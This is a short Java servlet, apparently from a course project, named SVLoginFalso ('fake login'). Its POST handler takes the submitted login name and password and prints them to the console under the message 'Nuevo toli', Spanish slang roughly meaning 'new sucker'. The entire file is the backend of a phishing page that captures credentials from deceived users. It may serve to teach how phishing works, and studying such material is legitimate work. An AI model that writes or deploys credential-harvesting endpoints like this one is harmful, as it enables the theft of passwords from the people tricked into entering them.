package com.curso.controlador;

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/SVLoginFalso")
public class SVLoginFalso extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    public SVLoginFalso() {
        super();
    }

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
	}

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

		String login = request.getParameter("login");
		String pw    = request.getParameter("pw");
		System.out.printf("Nuevo toli: Login:%s, pw:%s", login, pw);
	
	}

}
